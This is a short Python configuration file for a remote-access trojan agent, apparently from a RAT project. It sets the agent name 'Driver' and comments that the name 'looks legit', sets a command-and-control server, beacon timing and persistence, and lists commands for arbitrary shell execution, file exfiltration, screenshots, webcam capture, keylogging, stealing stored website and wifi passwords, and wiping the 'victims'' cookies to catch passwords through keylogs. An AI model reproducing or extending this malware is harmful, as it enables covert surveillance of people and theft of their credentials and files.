AGENT_NAME = "Driver"  # looks legit
SERVER = "http://localhost:8080"
HELLO_INTERVAL = 2
IDLE_TIME = 60
MAX_FAILED_CONNECTIONS = 10
PERSIST = True
HELP = """
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

python <command|file>
Runs a Python command or local file.

screenshot
Takes a screenshot.

camshot
Takes a webcam image.

keylogger
Shows all pressed keys since start up.

passwords
Shows all stored passwords on the pc, including websites and wifi.

delete passwords
Deletes all stored cookies from the victims' pc. 
This way you could try to retreive password from keylogs if you cannot get them from the passwords command.

persist
Installs the agent.

clean
Uninstalls the agent.

exit
Kills the agent.
"""